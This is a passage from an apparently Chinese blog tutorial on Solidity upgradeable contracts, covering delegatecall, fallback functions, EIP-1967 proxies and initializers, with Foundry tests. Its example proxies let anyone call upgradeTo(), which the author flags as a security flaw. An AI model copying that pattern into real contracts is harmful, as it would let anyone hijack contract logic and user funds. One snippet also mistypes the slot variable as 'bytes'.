aliceBalanceSlot));</span><br><span class="line"></span><br><span class="line">        // Make sure that the loaded balance matches Alice&#x27;s real balance</span><br><span class="line">        assertEq(aliceBalance, t.balanceOf(Alice));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/image/Upgradeable-Contract.assets/image-20230221194303023.png" alt="image-20230221194303023"></p><p>在这个例子中，我们想检索<code>t.balanceOf(Alice)</code>的值，但我们没有直接这样做，而是手动计算Alice的余额所在的槽。为此，<code>aliceBalanceSlot</code>是按照上面的描述计算的。然后我们使用 Foundry 提供的 <a href="https://book.getfoundry.sh/cheatcodes/load">vm.load()</a> 来加载合约 <code>Token</code>中存储在slot上的值。最后，我们使用 <code>assertEq()</code> 来确保我们实际上已经加载了正确的值</p><p>对于像Token这样的简单合约，我们可以很容易地手动计算出合约变量的slot。然而对于使用继承的更复杂的合约，或者有多个变量被存储在同一个slot中的合约，要计算合约变量的位置就变的很困难。Foundry 提供了一个命令来可视化合约的存储布局。例如，要显示 Token 合约的存储布局，你可以使用以下命令。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">forge inspect Token storage-layout</span><br></pre></td></tr></table></figure><p><img src="/image/Upgradeable-Contract.assets/image-20230221194830454.png" alt="image-20230221194830454"></p><p><a href="https://github.com/naddison36/sol2uml">sol2uml</a> 可以用于分析已经部署的合约。</p><h3 id="0x03-delegatecall-委托调用"><a href="#0x03-delegatecall-委托调用" class="headerlink" title="0x03 delegatecall 委托调用"></a>0x03 delegatecall 委托调用</h3><p>这主要是由于<code>delegatecall</code>指令[注2]，它使用一个合约的代码，并使用另一个合约的存储来执行它，因此可以通过该指令升级智能合约并改变其行为。这可以通过一个简单的例子来说明。</p><blockquote><p>注2: 如果我们一般性地谈论改变合约的行为，那么这已经可以用<code>selfdestruct</code>来实现了，因为它<em>删除了所有</em>代码。虽然这是一种非常有限的（而且不是非常有用的）改变合约行为的形式，但当与<a href="https://medium.com/consensys-diligence/smart-contract-security-newsletter-16-create2-faq-b641405044bf">create2</a>结合时，就有了更多的可能性。然而，<code>delegatecall</code>仍然是实现可升级合约的主要方式。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Counter &#123;</span><br><span class="line">  uint256 number;</span><br><span class="line"></span><br><span class="line">  function get() external view returns(uint256) &#123;</span><br><span class="line">    return number;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function add(uint256 n) external &#123;</span><br><span class="line">    require(n &lt;= 5, &quot;Max increment is 5&quot;);</span><br><span class="line">    number += n;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract DelegateCounter &#123;</span><br><span class="line">  uint256 number;</span><br><span class="line"></span><br><span class="line">  function get() external view returns(uint256) &#123;</span><br><span class="line">    return number;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function delegateAdd(Counter c, uint256 n) external &#123;</span><br><span class="line">    bytes memory callData = abi.encodeWithSignature(&quot;add(uint256)&quot;, n);</span><br><span class="line">    (bool ok,) = address(c).delegatecall(callData);</span><br><span class="line"></span><br><span class="line">    if(!ok) revert(&quot;Delegate call failed&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Counter合约代表了一个每次最多只能增加5的计数器，其定义了<code>add()</code>函数来执行这个操作，还定义了<code>get()</code>函数来获取当前计数器的值，除了函数<code>delegateAdd()</code>外，<code>DelegateCounter</code>合约与<code>Counter</code>基本相同。为了解释<code>delegateAdd()</code>是如何工作的，下面给出这两个合约的结构：</p><img src="/image/Upgradeable-Contract.assets/20230106095227.png" alt="Foundry test on command" style="zoom:33%;" /><p><code>delegateAdd()</code>使用<code>delegatecall</code>来执行来自合约<code>Counter</code>的函数<code>add()</code>，使用<code>DelegateCounter</code>的上下文来存储。两个合约应该有兼容的存储布局，也就是说，它们应该将相同的变量分配到相同的slot中。</p><p><code>delegatecall</code>是Solidity中的一个低级原语，使用起来不如普通函数调用方便。一般来说，每当我们想在一个合约上调用一个函数时，我们需要同时指定我们想调用的函数和我们想传递的论据。这些信息需要以一种众所周知的格式进行编码，以便目标合约知道如何解释它。这种格式也被称为应用二进制接口（ABI），并在 <code>合约ABI规范 </code>中描述。对于正常的函数调用，Solidity为我们做了这个编码，但是当使用<code>delegatecall</code>时，需要自己获取编码。这是在<code>delegateAdd()</code>的第一行完成的。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bytes memory callData = abi.encodeWithSignature(&quot;add(uint256)&quot;, n);</span><br></pre></td></tr></table></figure><p><code>encodeWithSignature()</code>的第一个参数表示我们要调用的函数的签名，其余参数表示我们要传递给该函数的值。在上面的例子中，我们对一个名为add的函数的调用进行了编码，该函数需要一个<code>uint256</code>类型的参数，其值应该是<code>n</code>。如果我们假设<code>n</code>是，例如，4，那么<code>callData</code>将看起来如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x1003e2d20000000000000000000000000000000000000000000000000000000000000004</span><br></pre></td></tr></table></figure><p>前四个字节代表 “函数选择器”，它是通过获取函数签名的 keccak 哈希值中最重要的前四个字节计算出来的。这个函数签名是 “add(uint256)”，我们可以使用 Foundry 自带的 cast 命令行工具来计算其 keccak 哈希值。</p><p><img src="/image/Upgradeable-Contract.assets/image-20230222114710713.png" alt="image-20230222114710713"></p><p>然后把它传递给<code>deldegatacall</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(bool ok,) = address(c).delegatecall(callData);</span><br></pre></td></tr></table></figure><p>这一行在当前合约的上下文中执行函数<code>Counter.add()</code>。任何由<code>Counter.add()</code>执行的存储访问都将使用调用合约的存储，在此案例中，它是<code>DelegateCounter</code>类型。因此，当<code>Counter.add()</code>函数写到slot 0以更新存储变量<code>number</code>时，它更新的是<code>DelegateCounter</code>的存储，而不是<code>Counter</code>的存储。</p><p><code>delegatecall</code>返回两个值。一个表示调用是否成功的布尔值，和一个包含任何返回数据的字节数组。由于<code>Counter.add()</code>不返回任何东西，<code>delegateAdd()</code>忽略返回数据，只检查调用是否成功。这里用一个固定的消息来作为revert 消息，而不是返回原始错误。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!ok) revert(&quot;Delegate call failed&quot;);</span><br></pre></td></tr></table></figure><p>在forge中进行测试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract DelegateCallTest is Test &#123;</span><br><span class="line">    function testDelegate() public &#123;</span><br><span class="line">        Counter c = new Counter();</span><br><span class="line">        DelegateCounter d = new DelegateCounter();</span><br><span class="line"></span><br><span class="line">        // Sanity check: both counters should start at zero</span><br><span class="line">        assertEq(c.get(), 0);</span><br><span class="line">        assertEq(d.get(), 0);</span><br><span class="line"></span><br><span class="line">        d.delegateAdd(c, 4);</span><br><span class="line"></span><br><span class="line">        // Check that `d` has been updated</span><br><span class="line">        assertEq(c.get(), 0);</span><br><span class="line">        assertEq(d.get(), 4);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/image/Upgradeable-Contract.assets/image-20230222115303905.png" alt="image-20230222115303905"></p><p>首先创建了 <code>Counter </code>和 <code>DelegateCounter </code>合约的新实例，他们的计数器的初始值都为 0，调用<code>d.delegateAdd(c, 4)</code>。如上所述，<code>delegateAdd()</code>本质上是调用<code>c.add(4)</code>，其方式是所有存储访问都指向<code>d</code>而不是<code>c</code>。下面两个断言验证了这一点，它们检查了<code>c</code>仍然为零，而<code>d</code>已经被更新。</p><p>我们可以将任何合约传递给<code>delegateAdd()</code>，它实现了一个签名为<code>add(uint256)</code>的函数。因此，即使 <code>DelegateCounter </code>保持不变，我们也可以通过向 <code>delegateAdd() </code>传递一些其他合约来改变其行为。然而，为了完全实现可升级的合约，我们还需要关注会退函数。在这之前，如何处理<code>delegatecall</code>的第二个返回值，即包含从被调用函数返回的数据的字节数组也是很有用的。</p><h3 id="0x04-处理-delegatecall-返回值"><a href="#0x04-处理-delegatecall-返回值" class="headerlink" title="0x04 处理 delegatecall 返回值"></a>0x04 处理 delegatecall 返回值</h3><p>使用<code>delegatecall</code>比正常的函数调用复杂，因为我们必须根据ABI对调用进行手动编码。从调用中返回的数据也是如此。我们只是得到一个原始的字节数组，我们需要根据被调用的函数的返回类型自己解码。为了说明如何做到这一点，我们现在为<code>DelegateCounter</code>实现一个<code>delegateGet()</code>函数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract DelegateCounter &#123;</span><br><span class="line">  // ...</span><br><span class="line"></span><br><span class="line">  function delegateGet(Counter c) external returns(uint256) &#123;</span><br><span class="line">    bytes memory callData = abi.encodeWithSignature(&quot;get()&quot;);</span><br><span class="line">    (bool ok, bytes memory retVal) = address(c).delegatecall(callData);</span><br><span class="line"></span><br><span class="line">    if(!ok) revert(&quot;Delegate call failed&quot;);</span><br><span class="line"></span><br><span class="line">    return abi.decode(retVal, (uint256));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个实现与<code>delegateAdd()</code>非常相似。我们首先对我们想要执行的调用进行ABI编码，然后使用<code>delegatecall</code>来进行调用。然而，这一次我们也处理了由调用返回的数据，我们将其存储在<code>retVal</code>中。因为<code>get()</code>返回一个<strong>uint256</strong>，ABI规定像<strong>uint256</strong>这样的固定宽度类型的值是通过简单的取其<a href="https://en.wikipedia.org/wiki/Endianness">big-endian</a>表示并将结果填充到32字节来编码的，返回的数据可以通过简单的将retVal 类型转换为<strong>uint256</strong>来解码。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return uint256(bytes32(retVal));</span><br></pre></td></tr></table></figure><p>对于复杂的类型，解码变得更加复杂。Solidity提供了函数<code>abi.decode()</code>，可以为我们执行解码。使用这个函数，我们可以将返回语句重写如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return abi.decode(retVal, (uint256));</span><br></pre></td></tr></table></figure><p>函数<code>abi.decode()</code>需要两个参数。一个包含一些ABI编码值的字节数组，以及一个包含编码值类型的元组。</p><h3 id="0x05-泛化"><a href="#0x05-泛化" class="headerlink" title="0x05 泛化"></a>0x05 泛化</h3><p>我们可以对<code>delegateGet()</code>做最后的修改，以便对处理返回数据的方式进行概括。注意，当我们用<code>abi.decode(retVal, (uint256))</code>对返回数据进行解码时，我们对返回类型进行了硬编码。如果我们想在任意函数中使用<code>delegatecall</code>，那么我们也需要能够处理任意的返回数据。这在纯 Solidity 中是不可能的，所以我们需要转向汇编。特别是，我们需要替换：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return abi.decode(retVal, (uint256));</span><br></pre></td></tr></table></figure><p>将其替换为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assembly &#123;</span><br><span class="line">  let data := add(retVal, 32)</span><br><span class="line">  let size := mload(retVal)</span><br><span class="line">  return(data, size)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/image/Upgradeable-Contract.assets/20230106095235.png" alt="协议方案" style="zoom:35%;" /><p><code>return(data,size)</code>指令结束当前函数的执行，并返回由<code>data</code>和<code>size</code>给出的内存范围内的数据，其中data表示起始地址，<code>size</code>表示数据的字节大小（详见<a href="https://docs.soliditylang.org/en/latest/yul.html#specification-of-yul">Yul规范</a>）。在上面的例子中，<code>data</code>和<code>size</code>的计算方式可能不是很明显。要理解这一点，重要的是要知道数组是如何在内存中布局的。首先，请注意，当我们从汇编块中引用像<code>retVal</code>这样的内存变量时，我们实际上是指它的地址。因此，当我们在上面的汇编块中使用<code>retVal</code>时，我们指的是<code>retVal</code>所表示的字节数组在内存中的起始地址。其次，Solidity在内存中排列数组的方式如下 [注4]。首先是数组的长度, 存储为一个32字节的无符号数字, 然后是所有的数组元素. 因此，<code>retVal</code>的数组长度直接存储在<code>retVal</code>的地址（我们通过<code>mload</code>加载），为了得到数组元素的地址，我们需要给<code>retVal</code>增加一个32字节的偏移量。</p><blockquote><p>注4: 这与数组在存储中的布局不同，<a href="https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html">存储中状态变量的布局</a>和<a href="https://docs.soliditylang.org/en/latest/internals/layout_in_memory.html">内存中的布局</a>。</p></blockquote><p>有了上述汇编，我们可以简单地转发任何来自<code>delegatecall</code>的返回数据，而不需要知道编码后的值的类型。这使得我们可以调用任意的函数而不需要事先知道它们的返回类型。</p><p>最后的代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function delegateGetBetter(Counter c) external returns(uint256) &#123;</span><br><span class="line">        bytes memory callData = abi.encodeWithSignature(&quot;get()&quot;);</span><br><span class="line">        (bool ok, bytes memory retVal) = address(c).delegatecall(callData);</span><br><span class="line"></span><br><span class="line">        if(!ok) revert(&quot;Delegate call failed&quot;);</span><br><span class="line"></span><br><span class="line">        assembly &#123;</span><br><span class="line">            let data := add(retVal, 32)</span><br><span class="line">            let size := mload(retVal)</span><br><span class="line"></span><br><span class="line">            // The `return` instruction expects two arguments that describe the region in memory</span><br><span class="line">            // that contains the return data:</span><br><span class="line">            // - The address in memory that stores the beginning of the return data.</span><br><span class="line">            // - The size of the return data in bytes.</span><br><span class="line">            //</span><br><span class="line">            // `retVal` refers to a byte array in memory. The first slot (32 bytes) contains the</span><br><span class="line">            // number of elements, and the following slots contain the elements themselves.</span><br><span class="line">            return(data, size)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="0x06-回退函数"><a href="#0x06-回退函数" class="headerlink" title="0x06 回退函数"></a>0x06 回退函数</h3><p><a href="https://docs.soliditylang.org/en/latest/contracts.html#fallback-function">回退函数</a>是实现可升级合约时另一个有用的功能。它们允许开发者指定当一个不存在的函数被调用时应该发生什么。默认的行为是回退，但这可以被改变。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">interface Ifc &#123;</span><br><span class="line">  function hello() external;</span><br><span class="line">  function bye() external;</span><br><span class="line">&#125;</span><br><span class="line">contract C &#123;</span><br><span class="line">  event Log(string msg);</span><br><span class="line"></span><br><span class="line">  function hello() external &#123;</span><br><span class="line">    emit Log(&quot;hello&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external &#123;</span><br><span class="line">    emit Log(&quot;fallback&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面我们定义了一个带有函数<code>hello()</code>和<code>bye()</code>的简单接口。此外，我们定义了一个合约<code>C</code>，它包含一个函数<code>hello()</code>和一个<em>fallback</em>函数。现在考虑下面的例子：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Ifc ifc = Ifc(address(new C()));</span><br><span class="line">ifc.hello(); // Emits Log(&quot;hello&quot;)</span><br><span class="line">ifc.bye();   // Emits Log(&quot;fallback&quot;)</span><br></pre></td></tr></table></figure><p>我们创建了一个新的合约<code>C</code>的实例，并将其转换为 <code>Ifc</code> 类型，这使得我们可以同时调用<code>hello()</code>和<code>bye()</code>。当我们调用<code>Bye()</code>时，由于<code>C</code>没有定义，所以会执行回退函数。</p><p>一个有用的事实是，我们可以使用<code>msg.data</code>来访问触发回退函数的原始调用数据。例如，如果在<code>C</code>的回退函数中加入<code>console.logBytes(msg.data)</code>，那么在调用<code>ifc.bye()</code>时就会产生如下日志信息。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0xe71b8b93</span><br></pre></td></tr></table></figure><p>这是<code>bye()</code>的函数选择器，这意味着通过检查<code>msg.data</code>我们可以确定用户最初打算调用哪个函数。</p><h3 id="0x07-创建可升级合约"><a href="#0x07-创建可升级合约" class="headerlink" title="0x07 创建可升级合约"></a>0x07 创建可升级合约</h3><p>使用<code>delegatecall</code>和回退函数，我们可以实现一个基于<strong>代理</strong>的可升级合约的一般解决方案。其核心思想如下。对于每一个我们希望其代码可以升级的合约，我们实际上部署了<em>两个</em>合约。一个<em>代理合约</em>和一个<em>逻辑合约</em>。代理合约是存储所有数据的合约，而逻辑合约则包含对这些数据进行操作的功能。用户将只与代理合约进行交互。当用户在代理上调用一个函数时，代理会使用一个委托调用将调用转发给逻辑合约。因为代理使用委托调用，执行逻辑合约的函数会影响代理的存储。因此，当使用可升级合约时，代理持有状态，而逻辑合约持有代码。从用户的角度来看，代理的行为与逻辑合约的行为是一样的。升级合约只是意味着代理使用了一个新的逻辑合约。</p><h4 id="7-1-实现代理合约I"><a href="#7-1-实现代理合约I" class="headerlink" title="7.1 实现代理合约I"></a>7.1 实现代理合约I</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract FaultyProxy &#123;</span><br><span class="line">  address public implementation;</span><br><span class="line"></span><br><span class="line">  function upgradeTo(address newImpl) external &#123;</span><br><span class="line">    implementation = newImpl;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external payable &#123;</span><br><span class="line">    (bool ok, bytes memory returnData) = implementation.delegatecall(msg.data);</span><br><span class="line"></span><br><span class="line">    if(!ok)</span><br><span class="line">      revert(&quot;Calling logic contract failed&quot;);</span><br><span class="line"></span><br><span class="line">    // Forward the return value</span><br><span class="line">    assembly &#123;</span><br><span class="line">      let data := add(returnData, 32)</span><br><span class="line">      let size := mload(returnData)</span><br><span class="line">      return(data, size)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个代理合约在一般情况下是不起作用的，代理有一个全局变量<code>implementation</code>，它存储了逻辑合约的地址。通过调用<code>upgradeTo()</code>可以改变逻辑合约，使逻辑（代码）可以升级。（目前所有人都可以调用<code>upgradeTo()</code>。这里还需要使用的回退函数，它的目的是转发任何对使用<code>delegatecall</code>的逻辑合约的调用。(除了对<code>upgradeTo()</code>和<code>implementation()</code>的调用，这些调用是由代理本身处理的。) 但我们怎么知道用户想调用哪个函数呢？幸运的是，触发回退函数的原始calldata可以通过<code>msg.data</code>访问 [注 5]。由于 calldata 包含函数签名和参数值，我们可以将 <code>msg.data</code>传递给<code>delegatecall</code>，之后再检查是否调用成功，如果不成功就 revert，否则就转发返回数据。</p><blockquote><p>注 5： 回退函数也可以使用不同的签名，其中calldata被直接作为参数传递。更多信息请参见 Solidity 文档 关于 <a href="https://learnblockchain.cn/docs/solidity/contracts.html#fallback">fallback 函数</a> 的说明。</p></blockquote><p>下面给出一个使用如何使用代理合约的例子：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 创建逻辑合约</span><br><span class="line">Counter logic = new Counter();</span><br><span class="line"></span><br><span class="line">// 创建代理并告诉他应该使用的逻辑合约</span><br><span class="line">FaultyProxy proxy = new FaultyProxy();</span><br><span class="line">proxy.upgradeTo(address(logic));</span><br><span class="line"></span><br><span class="line">// 为了从逻辑合约中调用函数，将代理转为正确的类型</span><br><span class="line">Counter proxied = Counter(address(proxy));</span><br><span class="line"></span><br><span class="line">// 将代理合约看作是逻辑合约</span><br><span class="line">proxied.add(2);</span><br><span class="line"></span><br><span class="line">// 检查是否生效</span><br><span class="line">console.log(&quot;counter = &quot;,proxied.get());</span><br></pre></td></tr></table></figure><p>前两步分别创建了逻辑和代理合约。第二步还调用了<code>upgradeTo()</code>，这样代理就知道要使用哪个逻辑合约。第三步需要告诉Solidity编译器，我们现在计划使用代理，就像它是逻辑合约一样。第四步是它变得有趣的地方。我们在代理上调用<code>add()</code>函数。由于代理没有定义任何该名称的函数，其回调函数被执行。在回调函数中，<code>msg.data</code>包含以下调用数据：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x1003e2d20000000000000000000000000000000000000000000000000000000000000002</span><br></pre></td></tr></table></figure><p>这代表了对一个签名为 “add(uint256)”、参数为2的函数的调用 。然后，回退函数用上述调用数据执行一个 “delegatecall”，使用代理的存储空间执行 “Counter “合约中的 “add() “函数。</p><p>最后，在第五步中，我们试图从代理中获取当前的计数器值。然而，执行<code>proxied.get()</code>实际上是回退了! 这个错误的原因可以通过可视化代理和逻辑合约来轻松解释。</p><p>下面是<code>FaultyProxy</code>和<code>Counter</code>合约的存储结构</p><img src="/image/Upgradeable-Contract.assets/foundry_scheme_4.png" alt="Foundry Scheme" style="zoom:33%;" /><p>当比较两个合约的存储布局时，我们可以注意到它们在slot 0中存储了不同的变量。这产生了一个严重的后果。当<code>Counter.add()</code>使用<code>FaultyProxy</code>的存储空间执行时，它覆盖了slot 0，以便更新<code>number</code>。然而，在合约<code>FaultyProxy</code>中，slot 0包含<code>implementation</code>的值。因此，当我们在步骤(4)中调用<code>proxied.add(2)</code>时，我们实际上将存储在<code>implementation</code>中的地址增加了2，使得地址无效。更确切地说，现在产生的地址指向一个账户，而这个账户很可能没有被部署过合约。当对一个空账户进行委托时，调用将成功，但没有数据被返回。然而，由于我们确实希望返回一个<code>uint256</code>类型的值，所以测试被revert。</p><h4 id="7-2-实现代理合约II"><a href="#7-2-实现代理合约II" class="headerlink" title="7.2 实现代理合约II"></a>7.2 实现代理合约II</h4><p>解决代理和逻辑合约之间的存储插槽碰撞问题，一个简单的方法是在<code>Counter</code>合约中的<code>number</code>前添加一个虚拟存储变量。然后，<code>number</code>将被存储在slot 1中，它将不再与<code>FaultyProxy</code>的<code>implementation</code>发生冲突。然而，这并不是一个好的解决方案，虚拟存储变量容易被遗忘，而且如果逻辑合约继承了其他合约，可能很难执行。</p><p>还有一个办法是遵循<a href="https://docs.openzeppelin.com/upgrades-plugins/1.x/proxies#unstructured-storage-proxies">非结构化存储模式</a>，它被广泛使用（例如OpenZeppelin，也见<a href="https://blog.openzeppelin.com/upgradeability-using-unstructured-storage/">使用非结构化存储的可升级性</a>），它为这个问题提供了一个不需要对逻辑合约进行任何修改的解决方案。其主要的思想是让代理合约将逻辑合约地址存储在一个地址很大的存储插槽中，这样一来，插槽碰撞的几率就可以忽略不计了。</p><p>实现一个新的代理合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Proxy &#123;</span><br><span class="line">bytes32 constant IMPLEMENTATION_SLOT = bytes32(uint256(keccak256(&#x27;eip1967.proxy.implementation&#x27;)) - 1);</span><br><span class="line"></span><br><span class="line">function upgradeTo(address newImpl) external &#123;</span><br><span class="line">bytes32 slot = IMPLEMENTATION_SLOT;</span><br><span class="line">assembly &#123;</span><br><span class="line">sstore(slot,newImpl)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function implementation() public view returns(address impl)&#123;</span><br><span class="line">bytes slot = IMPLEMENTATION_SLOT;</span><br><span class="line">assembly &#123;</span><br><span class="line">impl := sload(slot)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fallback() external payable &#123;</span><br><span class="line">(bool ok, bytes memory returnData) = implementation().delegatecall(msg.data);</span><br><span class="line">if(!ok)&#123;</span><br><span class="line">revert(&quot;Calling logic contract failed&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">assembly &#123;</span><br><span class="line">let data := add(returnData, 32)</span><br><span class="line">let size := mload(returnData)</span><br><span class="line">return(data, size)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Proxy</code>和<code>FaultyProxy</code>之间的关键区别是，<code>Proxy</code>没有声明任何存储变量。相反，逻辑合约的地址被存储在槽<code>IMPLEMENTATION_SLOT</code>中，它被计算为 <code>eip1967.proxy.implementation </code>字符串的keccak散列值减去 1[注6] 。这个插槽号在<a href="https://eips.ethereum.org/EIPS/eip-1967">EIP-1967</a>中被标准化。有了一个定义明确的槽来存储逻辑合约，像Etherscan这样的服务可以自动检测合约是否具有代理功能，在此案例中，可以显示代理和逻辑合约的信息。例如，如果你在Etherscan上查看<a href="https://etherscan.io/address/0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48#code">USDC</a>的代码，除了正常的 <code>读/写合约 </code>标签外，还有 <code>作为代理读/写 </code>的选项，它提供了一个指向当前逻辑合约的链接。</p><blockquote><p>注6: 为什么我们要从keccak的哈希值中减去一个？纯粹从功能的角度来看，这没有什么区别。使用不加-1的keccak哈希值也一样可以工作。然而，正如在<a href="https://eips.ethereum.org/EIPS/eip-1967">EIP-1967</a>中提到的，增加-1的偏移量是为了使预像攻击更加困难（见: <a href="https://github.com/ethereum/EIPs/pull/1967#issuecomment-489276813%EF%BC%89">https://github.com/ethereum/EIPs/pull/1967#issuecomment-489276813）</a></p></blockquote><p>测试代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract ProxyTest is Test &#123;</span><br><span class="line">    function testProxy() public &#123;</span><br><span class="line">        // (1) Create logic contract</span><br><span class="line">        Counter logic = new Counter();</span><br><span class="line"></span><br><span class="line">        // (2) Create proxy and tell it which logic contract to use</span><br><span class="line">        Proxy proxy = new Proxy();</span><br><span class="line">        proxy.upgradeTo(address(logic));</span><br><span class="line"></span><br><span class="line">        // (3) To be able to call functions from the logic contract, we need to</span><br><span class="line">        //     cast the proxy to the right type</span><br><span class="line">        Counter proxied = Counter(address(proxy));</span><br><span class="line">        proxied.initialize(23);</span><br><span class="line"></span><br><span class="line">        assertEq(proxied.get(), 23);</span><br><span class="line"></span><br><span class="line">        // (4) Now we treat the proxy as if it were the logic contract</span><br><span class="line">        proxied.add(2); // Works as expected</span><br><span class="line">        assertEq(proxied.get(), 25);</span><br><span class="line"></span><br><span class="line">        vm.expectRevert(&quot;Calling logic contract failed&quot;);</span><br><span class="line">        proxied.add(7); // Fails as expected</span><br><span class="line"></span><br><span class="line">        // (5) Upgrade to a new logic contract</span><br><span class="line">        proxy.upgradeTo(address(new CounterV2()));</span><br><span class="line"></span><br><span class="line">        // (6) Now adding a value larger than 5 actually works!</span><br><span class="line">        proxied.add(7);</span><br><span class="line">        assertEq(proxied.get(), 32);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>为了升级合约，<code>upgradeTo()</code>函数需要修改<code>IMPLEMENTATION_SLOT</code>给出的槽位上的地址，这可以使用<code>sstore</code>指令。注意，我们需要将<code>IMPLEMENTATION_SLOT</code>复制到一个局部变量中，因为不可能直接从汇编中读取常数。函数<code>implementation()</code>以类似的方式实现，读取存储在槽<code>IMPLEMENTATION_SLOT</code>的地址。最后，回退函数保持不变，只是我们现在使用<code>implementation()</code>函数而不是存储变量来获取逻辑合约地址。</p><p>我们使用<code>sstore</code>/<code>sload</code>来访问逻辑合约，而不是使用合约变量，这使得这个代理<em>非结构化</em>，这也解释了<em>非结构化存储模式</em>的名字。我们可以从合约存储结构中直观地看到代理和逻辑合约。</p><img src="/image/Upgradeable-Contract.assets/foundry_scheme_5.png" alt="逻辑方案" style="zoom:33%;" /><p>当使用<code>delegatecall</code>时，必须确保调用者合约和被调用者合约都有兼容的存储布局，对于<a href="https://docs.google.com/document/d/1jcgOWSRhSe6sDG4CO5r4eNrDkCGinLcOeJ1xXtDCeiY/edit#heading=h.5lko0ulckh7r">delegatecall</a>部分的<code>Counter</code>和<code>DelegateCounter</code>合约，这很容易验证，因为这两个合约定义的存储变量完全相同。另一方面，<code>Proxy</code>与<code>Counter</code>的存储布局不相同，但由于两个合约使用完全不同的存储插槽，因此也不会存在变量覆盖的问题。（事实上，<code>Proxy</code>是完全独立于所使用的具体逻辑合约，因此这意味着人们只需要写一个可以被所有人使用的代理。)</p><p>当然，这只有在<code>IMPLEMENTATION_SLOT</code>表示的槽不会意外地与逻辑合约中的任何存储变量冲突时才安全，<code>IMPLEMENTATION_SLOT</code>表示一个相当大的值。由于像 <code>uint256 </code>这样有固定大小的存储变量被分配到从零开始的槽号，现实中我们可以假设它们的插槽号比<code>IMPLEMENTATION_SLOT</code>小得多。而且在任何情况下，由于这些插槽是在编译时分配的，因此编译器可以检测到与<code>IMPLEMENTATION_SLOT</code>的碰撞并报告错误。</p><p>但是，对于动态大小的类型，如映射和动态数组，情况有点不同，其元素的存储槽是使用keccak hashes计算的（见Solidity文档中的<a href="https://learnblockchain.cn/docs/solidity/internals/layout_in_storage.html#id2">映射和动态数组</a>）。这样计算的槽实际上可能与<code>IMPLEMENTATION_SLOT</code>相冲突。(但是这种情况发生的概率很小)</p><p>虽然上面的代理实现是可行的，但它仍然存在一些缺陷，因此不应该被用于生产环境，这些缺陷是</p><ol><li>该代理容易受到函数选择器冲突的影响，这可能导致意外的行为（见”设计选择“ 一节）。</li><li><code>upgradeTo()</code>是无权限的，这意味着任何人都可以升级合约。由于升级合约可以极大地改变其行为，这是一个明显的安全问题，任何代理实现都必须解决。我们将在后续的文章中讨论与此直接相关的Audius攻击。</li></ol><h3 id="0x08-初始化合约"><a href="#0x08-初始化合约" class="headerlink" title="0x08 初始化合约"></a>0x08 初始化合约</h3><p>截至到目前，我们只使用了<code>Counter</code>合约作为逻辑合约，它非常简单，甚至没有一个用户定义的构造函数。这让我们成功地忽略了使用代理时产生的一个重要限制。不能使用构造函数。原因是构造函数实际上不是函数，因此不能被delegatecall调用。解决的办法是使用一个单独的初始化函数。让我们修改<code>Counter</code>，这样我们可以用计数器的初始值来初始化它。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">contract Counter &#123;</span><br><span class="line">  bool isInitialized;</span><br><span class="line">  uint256 number;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">initialize</span><span class="params">(uint256 start)</span> external </span>&#123;</span><br><span class="line">    require(!isInitialized, “Already initialized”);</span><br><span class="line">    number = start;</span><br><span class="line">    isInitialized = <span class="keyword">true</span>;</span><br><span class="line">  